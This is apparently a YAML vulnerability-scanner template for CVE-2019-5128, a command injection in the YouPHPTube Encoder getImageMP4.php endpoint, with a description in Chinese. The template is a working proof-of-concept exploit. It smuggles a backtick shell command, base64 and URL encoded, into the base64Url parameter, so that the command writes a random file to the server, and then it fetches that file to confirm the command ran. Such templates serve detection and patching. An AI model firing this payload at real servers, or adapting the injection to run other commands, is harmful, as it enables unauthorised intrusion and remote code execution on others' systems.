expression: r0() && r1()
id: CVE-2019-5128
info:
  author: 0x_zmz
  description: "\u5728 YouPHPTube \u7F16\u7801\u5668\u4E2D\u53D1\u73B0\u4E86\u547D\
    \u4EE4\u6CE8\u5165\u3002\u6210\u529F\u7684\u653B\u51FB\u53EF\u80FD\u5141\u8BB8\
    \u653B\u51FB\u8005\u7834\u574F\u670D\u52A1\u5668\u3002YouPHPTube Encoder 2.3 \u4E2D\
    \u5B58\u5728\u53EF\u5229\u7528\u7684\u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\
    \u547D\u4EE4\u6CE8\u5165\uFF0C\u8FD9\u662F\u4E00\u4E2A\u7528\u4E8E\u5728 YouPHPTube\
    \ \u4E2D\u63D0\u4F9B\u7F16\u7801\u5668\u529F\u80FD\u7684\u63D2\u4EF6\u3002/objects/getImageMP4.php\
    \ \u4E2D\u7684\u53C2\u6570 base64Url \u5BB9\u6613\u53D7\u5230\u547D\u4EE4\u6CE8\
    \u5165\u653B\u51FB\u3002"
  name: "YouPHPTube Encoder base64Url getImageMP4.php\u547D\u4EE4\u6CE8\u5165\u6F0F\
    \u6D1E"
  reference:
  - https://xz.aliyun.com/t/6708
  - https://talosintelligence.com/vulnerability_reports/TALOS-2019-0917
  severity: critical
rules:
  r0:
    expression: response.status == 200
    request:
      follow_redirects: true
      method: GET
      path: /objects/getImageMP4.php?base64Url={{payload}}&format=jpg
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(content))
    request:
      follow_redirects: true
      method: GET
      path: /objects/{{fileName}}
set:
  content: randomLowercase(8)
  fileName: randomLowercase(4) + ".txt"
  payload: urlencode(base64("`echo " + content + " > " + fileName + "`"))
